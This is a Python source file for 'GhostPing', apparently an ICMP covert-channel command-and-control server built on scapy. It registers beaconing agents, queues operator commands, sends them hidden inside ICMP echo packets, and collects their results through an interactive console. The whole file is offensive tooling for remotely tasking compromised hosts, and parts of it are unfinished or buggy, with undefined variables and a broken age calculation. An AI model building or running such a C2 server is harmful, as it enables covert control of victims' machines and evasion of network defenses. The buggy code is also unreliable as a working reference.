from scapy.all import *
import time
import os
import threading

COMMANDS = {} #agent_id -> list of commands
ACTIVE_AGENTS = set() #set of active agent ids
AGENT_INFO = {} #agent_id -> {"ip","last_seen"}
RESULTS = {} #agent_id -> list of results
INACTIVITY_TIMEOUT = 120 # number of seconds before agent becomes stale

lock = threading.Lock()

# Helper functions
def get_next_agent_id():
    # Returns the next available agent ID as a 3-digit string.
    if not AGENT_INFO:
        return "001"
    # IDs already in use
    used_ids = sorted(int(agent_id) for agent_id in AGENT_INFO.keys())
    next_id = 1
    for uid in used_ids:
        if uid == next_id:
            next_id += 1
        else:
            break
    if next_id > 999:
        raise Exception("Maximum number of agents reached")
    return f"{next_id:03d}"  # format as 3-digit string

def handle_packet(pkt):
    try:
        if ICMP in pkt and pkt[ICMP].type == 8 and Raw in pkt:
            payload = pkt[Raw].load.decode(errors="ignore")
            if "|" not in payload:
                return

            msg_type, result = payload.split("|", 1)

            # Only accept packets with custom payloads
            if msg_type != "BEACON" and msg_type != "RESULT":
                return  # ignore noise or non-client pings

            src = pkt[IP].src
            print(f"\n[+] Valid client packet from {src}: {payload}")

            # Check if this IP is already registered
            agent_id = None
            for aid, info in AGENT_INFO.items():
                if info["ip"] == src:
                    agent_id = aid
                    break
            
            # If this is a new agent, assign next available ID
            if not agent_id:
                agent_id = get_next_agent_id()
                AGENT_INFO[agent_id] = {"ip": src, "last_seen": time.time()}
                ACTIVE_AGENTS.add(agent_id)
                print(f"\n[+] New agent connected: {agent_id} ({src})")
            else:
                # Update last_seen timestamp
                AGENT_INFO[agent_id]["last_seen"] = time.time()

            # If there is a command queued, send it. Else, do nothing.
            if msg_type == "BEACON":
                queue = COMMANDS.get(agent_id)
                if not queue:
                    return

                task = queue.pop(0)   # get ONE command (FIFO)
                # Build reply packet as an echo request so it is routed properly.
                send(IP(dst=src)/ICMP(type=8)/task.encode(), verbose=0)
                print(f"[+] Sent task to {agent_id} ({src}): {task}")

                if not queue:
                    COMMANDS.pop(agent_id, None)

            elif msg_type == "RESULT":
                # Store results as 2-tuples with a timestamp
                RESULTS.setdefault(agent_id, []).append((time.time(), result))
    except Exception as e:
        print(f"!Handler exception: {e}")

def operator_console():
    print()
    print("--------------------------------------------------")
    print(r"   ________               __  ____  _            ")
    print(r"  / ____/ /_  ____  _____/ /_/ __ \(_)___  ____ _")
    print(r" / / __/ __ \/ __ \/ ___/ __/ /_/ / / __ \/ __ `/")
    print(r"/ /_/ / / / / /_/ (__  ) /_/ ____/ / / / / /_/ / ")
    print(r"\____/_/ /_/\____/____/\__/_/   /_/_/ /_/\__, /  ")
    print(r"                                        /____/  ")
    print("--------------------------------------------------")
    print()

    print("[*] Operator console ready. Type 'help' for commands.")
    while True:
        try:
            cmd_line = input("GhostPing> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Exiting.")
            os._exit(0)

        if not cmd_line:
            continue

        parts = cmd_line.split(" ", 2)  # Splits the task command into two parts: the identifier (id, ip, or hostname) and the command.
        cmd = parts[0].lower()

        if cmd == "help":
            print("Commands:")
            print("  list                         - List active agents (shows id, ip, hostname, age)")
            print("  info <id|ip|hostname>        - Show detailed info for an agent")
            print("  task <id|ip|hostname> <cmd>  - Queue a command for an agent")
            print("  results <id|ip|hostname>     - Show results from an agent")
            print("  exit                         - Stop the server")
            continue

        if cmd == "list":
            with lock:
                now = time.time()
                # Lazy prune stale agents
                for agent_id in list(ACTIVE_AGENTS):
                    if now - AGENT_INFO[agent_id]["last_seen"] > INACTIVITY_TIMEOUT:
                        ACTIVE_AGENTS.remove(agent_id)
                        COMMANDS.pop(agent_id, None)
                        RESULTS.pop(agent_id, None)
                        AGENT_INFO.pop(agent_id, None)
                        print(f"[PRUNE] Removed stale agent {agent}")

                if not ACTIVE_AGENTS:
                    print("No active agents.")
                else:
                    print("[*] Active agents (" + str(len(ACTIVE_AGENTS)) + "):")
                    for agent in sorted(ACTIVE_AGENTS):
                        info = AGENT_INFO.get(agent, {})
                        ip = info.get('ip', 'unknown')
                        host = info.get('hostname', 'unknown')
                        age = int(now - now - AGENT_INFO[agent_id]["last_seen"])
                        print(f" - id={agent} ip={ip} host={host} age={age}s")
            continue

        # if cmd == "info":
        #     if len(parts) < 2:
        #         print("Usage: info <agent_id|ip|hostname>")
        #         continue
        #     identifier = parts[1]
        #     aid = find_agent_by_identifier(identifier)
        #     if not aid:
        #         print("No such agent.")
        #         continue
        #     with lock:
        #         info = AGENT_INFO.get(aid, {})
        #         print(f"Agent ID: {aid}")
        #         print(f"  IP: {info.get('ip', 'unknown')}")
        #         print(f"  Hostname: {info.get('hostname', 'unknown')}")
        #         age = int(time.time() - LAST_SEEN.get(aid, time.time()))
        #         print(f"  Last seen: {age}s ago")
        #         print(f"  Queued tasks: {len(COMMANDS.get(aid, []))}")
        #         print(f"  Stored result chunks: {len(RESULTS.get(aid, []))}")
        #     continue

        if cmd == "task":   # working on this
            if len(parts) < 3:
                print("Usage: task <agent_id|ip|hostname> <command>")
                continue
            identifier = parts[1]
            command_text = parts[2]
            if not identifier:
                print("No such agent (or stale).")
                continue
            with lock:
                # optional staleness check
                COMMANDS.setdefault(identifier, []).append(command_text)
                # report back which agent id and ip got the task
                ip = AGENT_INFO.get(identifier, {}).get("ip")
                print(f"\n[+] Queued command for id={identifier} ip={ip}: {command_text}")
            continue

        if cmd == "results":
            if len(parts) < 2:
                print("Usage: results <agent_id|ip|hostname>")
                continue
            identifier = parts[1]
            if not identifier:
                print("No such agent.")
                continue
            with lock:
                chunks = sorted(RESULTS.get(identifier, []))
                if not chunks:
                    print(f"No results for {identifier}")
                    continue
                full_result = "\n".join(chunk for _, chunk in chunks)
                print(f"--- Results from id={identifier} ---")
                print(full_result)
                print("-------------------------------")
                RESULTS[identifier] = []
            continue

        if cmd in ("quit", "exit"):
            print("[*] Quitting C2 server.")
            os._exit(0)

        print("Unknown command. Type 'help'.")

def main():
    print("[*] Starting ICMP C2 server...")
    # start operator console in background
    threading.Thread(target=operator_console, daemon=True).start()
    # start sniffing for ICMP beacons / results
    sniff(filter="icmp", prn=handle_packet)

if __name__ == "__main__":
    main()
